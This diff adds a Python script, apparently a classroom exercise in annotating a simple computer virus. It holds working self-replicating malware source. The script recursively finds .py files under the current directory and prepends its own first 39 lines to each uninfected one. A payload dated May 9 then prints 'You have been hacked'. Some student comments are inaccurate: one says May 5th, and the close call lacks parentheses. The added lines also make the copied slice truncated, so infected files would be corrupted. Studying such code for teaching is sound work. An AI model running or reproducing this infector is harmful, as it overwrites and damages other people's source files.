@@ -1,0 +1,91 @@
+#!/usr/bin/python3 
+
+import os 
+
+import datetime 
+
+#Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
+#Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
+#Insert comments above the final three lines explaining how the functions are called and what this script appears to do.
+
+SIGNATURE = "VIRUS" #Signature tells us whether or not the file is infected
+
+def locate(path): #Repeatedly looks for files to infect in this path
+
+    files_targeted = [] #Empty array of file names
+    
+    filelist = os.listdir(path) #Get a list of files in this directory path
+    
+    for fname in filelist: #Targets each new entry from the file list with specific commands
+    
+        if os.path.isdir(path+"/"+fname): #If the entry is a directory, run the command
+        
+            files_targeted.extend(locate(path+"/"+fname)) #Runs the locate function on the directory to add more files to the file list
+            
+        elif fname[-3:] == ".py": #If the file is python then execute these commands
+        
+            infected = False #Make is so that the 'infected' variable is set to false by default
+            
+            for line in open(path+"/"+fname): #Checks out each row in a specified file path
+            
+                if SIGNATURE in line: #Checks to see if the virus signature is hiding in the file
+                
+                    infected = True #If we detect the signature then set 'infected' to True
+                    break
+                    
+            if infected == False: #If we do not detect the signature then set 'infected' to False
+            
+                files_targeted.append(path+"/"+fname) #Adds a path and filename of a specific file to a list of files for targeting
+    return files_targeted 
+    
+       
+def infect(files_targeted): #This is a function that tells the system to find and target files to spread an infection
+
+    
+    virus = open(os.path.abspath(__file__)) #Opens and looks at the instruction inside the virus program
+    
+    
+    virusstring = "" #Set the virus string variable to have no value
+    
+    
+    for i,line in enumerate(virus): #Looks at each row of the file that contains info about the virus
+    
+    
+        if 0 <= i < 39: #If the number is greater than or equal to 0 and less than 39, then it' within acceptable range
+        
+        
+            virusstring += line #Adds the line to the virus string
+            
+           
+    virus.close #Closes the file connection used to iniate a virus
+    
+    
+    for fname in files_targeted: #Loops through the list of targeted files / stores each item in the variable fname
+    
+    
+        f = open(fname) #Creates a file handler then captures and reads what the variable fname contains
+        
+     
+        temp = f.read() #File handler and read function to capture data to the temp file
+     
+      
+        f.close() #Closes the file handler
+        
+     
+        f = open(fname,"w") #File handler to open file for writing
+        
+     
+        f.write(virusstring + temp) #File handler writes the virus file string and temp data into the file
+        
+     
+        f.close() #Close file handler
+
+def detonate(): #Function named 'detonate'
+
+    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: #If the date is May 5th then "you have been hacked" will be displayed.
+        print("You have been hacked")
+
+
+files_targeted = locate(os.path.abspath(""))
+infect(files_targeted)
+detonate() # This line would call out the array values on files of a specified path and execute the previously defined function called detonate.
